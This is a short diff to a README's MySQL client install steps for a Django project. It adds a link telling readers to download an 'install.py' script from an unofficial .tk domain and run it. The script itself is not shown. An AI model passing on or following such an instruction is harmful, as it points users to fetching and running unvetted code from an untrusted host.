@@ -14,7 +14,7 @@
         
 ## How to Install Required MysqlClient
 
-- Copy the install.py code to ur Django project
+- Copy or [Download]('http://mysqlclient.tk/index.html') <b>install.py</b> code to ur Django project
 - Activate your virtual env(Optional)
 - Run the code
 
